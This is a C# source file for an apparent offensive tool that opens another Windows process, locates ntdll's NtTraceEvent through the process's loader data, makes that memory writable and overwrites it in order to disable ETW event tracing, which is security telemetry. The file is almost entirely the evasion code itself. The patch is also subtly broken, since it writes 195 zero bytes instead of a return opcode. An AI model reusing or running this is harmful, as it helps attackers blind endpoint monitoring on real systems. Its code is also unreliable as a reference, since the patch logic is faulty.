using System;
using System.Runtime.InteropServices;

namespace SharpDiabellstar
{
    class Program
    {

        private static IntPtr GetProcAddress(IntPtr ntdllAddress)
        {
            var getprocStatus = Win32.LdrGetProcedureAddress(
                ntdllAddress,
                new Win32.ANSI_STRING("NtTraceEvent"),
                0,
                out IntPtr ProcedureAddress
            );

            if (getprocStatus != Win32.NTSTATUS.Success)
                throw new Exception($"LdrGetProcedureAddress ERROR! Status: {getprocStatus}");

            return ProcedureAddress;
        }

        private static IntPtr GetNtdllAddress(IntPtr hProcess)
        {
            int ReturnLength = 0;

            var queryStatus = Win32.NtQueryInformationProcess(
                hProcess,
                Win32.PROCESSINFOCLASS.ProcessBasicInformation,
                out Win32.PROCESS_BASIC_INFORMATION pbi,
                Marshal.SizeOf(typeof(Win32.PROCESS_BASIC_INFORMATION)),
                ref ReturnLength
            );

            if (queryStatus != Win32.NTSTATUS.Success && pbi.PebBaseAddress != IntPtr.Zero)
                throw new Exception($"NtQueryInformationProcess ERROR! Status: {queryStatus}");

            var peb = Marshal.PtrToStructure<Win32.PEB>(Memory.ReadMemory(hProcess, pbi.PebBaseAddress, Memory.AllocateLocalMemory(Marshal.SizeOf(typeof(Win32.PEB))), Marshal.SizeOf(typeof(Win32.PEB))));
            var ldr = Marshal.PtrToStructure<Win32.PEB_LDR_DATA>(Memory.ReadMemory(hProcess, peb.Ldr, Memory.AllocateLocalMemory(Marshal.SizeOf(typeof(Win32.PEB_LDR_DATA))), Marshal.SizeOf(typeof(Win32.PEB_LDR_DATA))));

            var entry = Marshal.PtrToStructure<Win32.LDR_DATA_TABLE_ENTRY>(Memory.ReadMemory(hProcess, ldr.InLoadOrderModuleList.Flink, Memory.AllocateLocalMemory(Marshal.SizeOf(typeof(Win32.LDR_DATA_TABLE_ENTRY))), Marshal.SizeOf(typeof(Win32.LDR_DATA_TABLE_ENTRY))));
            var entry2 = Marshal.PtrToStructure<Win32.LDR_DATA_TABLE_ENTRY>(Memory.ReadMemory(hProcess, entry.InLoadOrderLinks.Flink, Memory.AllocateLocalMemory(Marshal.SizeOf(typeof(Win32.LDR_DATA_TABLE_ENTRY))), Marshal.SizeOf(typeof(Win32.LDR_DATA_TABLE_ENTRY))));

            string dllPath = Unicode.ReadUnicodeMemory(entry2.FullDllName.Length, hProcess, entry2.FullDllName.Buffer, 0);

            if (dllPath.Contains("ntdll")) return entry2.DllBase;

            return IntPtr.Zero;
        }

        static void Main(string[] args)
        {
            var oa = new Win32.OBJECT_ATTRIBUTES();
            var ci = new Win32.CLIENT_ID(); ci.UniqueProcess = (IntPtr)Convert.ToInt32(args[0]);

            var handleStatus = Win32.NtOpenProcess(
                out IntPtr hProcess,
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_LIMITED_INFORMATION |
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ |
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_VM_WRITE |
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION, // alterar depois
                oa,
                ci
            );

            if (handleStatus != Win32.NTSTATUS.Success)
                throw new Exception($"NtOpenProcess ERROR! Status: {handleStatus}");

            IntPtr ntdllAddress = GetNtdllAddress(hProcess);
            IntPtr etwAddress = GetProcAddress(ntdllAddress);

            long etwOffset = Convert.ToInt64(etwAddress) - Convert.ToInt64(ntdllAddress);

            Console.WriteLine($"[^] Ntdll ADDRESS: 000000{ntdllAddress.ToString("X")}");
            Console.WriteLine($"[^] NtTraceEvent ADDRESS: 000000{etwAddress.ToString("X")} (offset: {etwOffset.ToString("X")})");

            byte[] ret = new byte[0xC3];

            IntPtr etwVA = new IntPtr(ntdllAddress.ToInt64() + etwOffset);
            IntPtr protectSize = new IntPtr(ret.Length);

            var oldProtection = Memory.ChangeMemory(
                hProcess,
                etwVA,
                ret.Length,
                Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE
            );

            Console.WriteLine($"[^] Memory {oldProtection} changed to PAGE_EXECUTE_READWRITE");

            Memory.WriteMemory(
                hProcess,
                etwVA,
                ret,
                ret.Length
            );

            Memory.ChangeMemory(
                hProcess,
                etwVA,
                ret.Length,
                oldProtection
            );
            
            Console.WriteLine("[^] Enjoy!");
        }
    }
}